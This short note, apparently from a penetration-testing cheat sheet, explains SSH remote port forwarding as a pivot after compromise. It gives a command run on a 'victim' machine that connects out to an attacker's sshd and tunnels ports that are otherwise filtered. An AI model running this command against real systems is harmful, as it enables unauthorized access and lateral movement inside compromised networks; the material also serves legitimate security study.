REMOTE port forwarding

Forwards remote port to local server.
If we are able to get the shell on the victim machine we can connect even to filtered or closed ports.
We need run sshd on attacker machine and have ssh installed on the victim machine.

Command

Executed on already compromised remote machine

ssh <user@attackers_sshd_IP> -p <attackers_sshd_port> -R <remote_port>:<localhost>:<local_port>
